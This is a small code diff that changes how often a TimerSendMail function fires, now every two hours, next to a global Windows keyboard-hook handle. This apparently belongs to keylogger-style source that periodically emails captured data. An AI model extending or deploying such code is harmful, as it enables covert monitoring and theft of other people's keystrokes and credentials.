@@ -31,7 +31,7 @@ void TimerSendMail(){
     }
 }
 
-Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite);
+Timer MailTimer(TimerSendMail, 3600 * 2 * 1000, Timer::Infinite); // every 2 hours
 
 HHOOK eHook = NULL;
 
